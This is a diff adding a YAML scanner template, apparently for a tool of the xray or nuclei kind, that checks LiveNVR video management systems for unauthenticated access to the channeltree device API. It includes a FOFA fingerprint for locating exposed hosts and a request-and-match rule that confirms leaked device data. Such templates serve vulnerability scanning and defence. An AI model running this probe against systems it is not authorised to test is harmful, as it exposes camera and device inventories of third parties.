@@ -1,0 +1,17 @@
+id: poc-yaml-liveqing-channeltree-unauthorized-access
+info:
+  name: livenvr 青柿视频管理系统 channeltree 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: livenvr
+  fofa: icon_hash="-206100324"
+requests:
+- method: GET
+  path: /api/v1/device/channeltree?serial=&pcode
+  expression: "status_code == 200 && \ncontains(body,\"code\") &&\ncontains(body,\"\
+    customName\") &&\ncontains(body,\"id\") &&\ncontains(body,\"manufacturer\") &&\n\
+    contains(body,\"serial\") &&\ncontains(body,\"status\") &&\ncontains(headers,\"\
+    application/json\")\n"
+variables: {}
+transport: http
